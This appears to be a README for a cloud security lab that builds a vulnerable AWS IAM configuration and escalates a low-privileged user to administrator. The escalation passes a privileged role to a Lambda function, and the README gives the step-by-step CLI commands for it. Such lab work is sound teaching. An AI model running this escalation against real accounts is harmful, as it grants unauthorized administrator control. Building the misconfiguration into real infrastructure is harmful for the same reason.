# AWS IAM Privesc

> A hands-on cloud security lab that builds a vulnerable AWS IAM configuration,
> exploits it to escalate from a low-privileged user to administrator and
> detects the attack in CloudTrail logs.

## Overview
This lab walks through a complete offensive-and-defensive workflow around a
common AWS IAM misconfiguration in three stages:

- **Build** — Terraform provisions a deliberately vulnerable IAM setup.
- **Attack** — using PMapper and Pacu, a low-privileged user escalates to
  administrator via the `iam:PassRole` + Lambda path.
- **Detect** — the Attack's footprint in CloudTrail is analyzed and a detection
  rule is written for it.

The goal is to show not just how the attack works but how to catch it.

## Attack Path
The escalation abuses the `iam:PassRole` permission:

1. A low-privileged IAM user holds `iam:PassRole`, `lambda:CreateFunction`,
   and `lambda:InvokeFunction`.
2. A privileged IAM role exists whose trust policy allows the Lambda service to
   assume it.
3. The user creates a Lambda function and passes the privileged role to it.
4. The function runs attacker-supplied code with that role's permissions.
5. Invoking it performs administrative actions (e.g. attaching
   `AdministratorAccess`), completing the escalation.

   ![AWS IAM privilege escalation attack path](images/iam-privesc-diagram.png)

## Prerequisites
- An AWS account (sandbox / non-production)
- Terraform and the AWS CLI
- Pacu and PMapper

## Exploitation

> Run once `terraform apply` has created the lab. Commands use the
> low-privileged **attacker** profile unless noted otherwise.

### 0. Capture the lab's outputs (from `terraform/`)
```bash
terraform output -raw attacker_access_key_id
terraform output -raw attacker_secret_access_key
terraform output -raw privileged_role_arn
```

### 1. Become the low-privileged user
```bash
aws configure --profile attacker      # paste the keys above; region us-east-1
aws sts get-caller-identity --profile attacker   # confirms: privesc-lab-lowpriv
```

### 2. Prove the user CANNOT escalate directly
```bash
aws iam attach-user-policy \
  --user-name privesc-lab-lowpriv \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile attacker
# Expected: AccessDenied — the user has no iam:AttachUserPolicy of its own
```

### 3. (Defender view) Map the path with PMapper
Run with account credentials that can read IAM — not the attacker profile:
```bash
pmapper graph create
pmapper query "preset privesc privesc-lab-lowpriv"
# PMapper reports the user can escalate via PassRole + Lambda
```

### 4. Execute the attack — as the attacker (from `exploit/`)
```bash
# package the payload  (PowerShell: Compress-Archive -Path lambda_function.py -DestinationPath function.zip)
zip function.zip lambda_function.py

# create the Lambda, PASSING the privileged role
aws lambda create-function \
  --function-name privesc-poc \
  --runtime python3.12 \
  --role <privileged_role_arn> \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://function.zip \
  --profile attacker

# invoke — the function runs AS the admin role and attaches admin to our user
aws lambda invoke --function-name privesc-poc out.json --profile attacker
cat out.json
```

### 5. Confirm escalation
```bash
aws iam list-attached-user-policies --user-name privesc-lab-lowpriv --profile attacker
# AdministratorAccess is now attached — the low-priv user is admin
```

### 6. Teardown
```bash
aws lambda delete-function --function-name privesc-poc --profile attacker
terraform destroy      # removes the user, role, and policies
```